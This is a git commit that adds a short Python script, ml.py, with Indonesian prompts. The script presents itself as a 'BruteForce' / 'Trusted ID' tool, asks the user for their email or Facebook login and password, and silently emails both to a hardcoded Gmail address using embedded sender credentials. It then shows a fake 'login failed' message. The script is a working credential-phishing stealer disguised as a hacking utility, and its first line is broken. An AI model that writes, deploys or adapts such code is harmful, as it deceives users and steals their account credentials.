2fe6cf740b1b86602020798b9bb35cac0f3546ca
Cyber-dev90 <56681401+Cyber-dev90@users.noreply.github.com>
2020-01-03 09:19:01 +0700

    Create ml.py

---
+++ ml.py
@@ -0,0 +1,18 @@
+os,time
+import yagmail
+from termcolor import colored
+os.system('figlet EmEl')
+os.system('figlet BruteForce')
+os.system('figlet ^_^')
+print(colored('[ Trusted ID ]','yellow'))
+print(colored('[!]Login Di Perlukan Untuk Mendapatkan Id T>
+h = input(colored('Email/FB: ','red'))
+j = input(colored('Password: ','white'))
+
+uwu = yagmail.SMTP('wirdagans@gmail.com','wirdasaputra')
+body = ('Email/Fb: '+h,'Passwordnya: '+j)
+
+subject = ' Sttt.. Akun Dateng Boss ! '
+uwu.send('kangyann57@gmail.com',subject,body)
+
+print(colored('[!]Maaf Gagal Login,Cek Password Atau Ulang','red'))
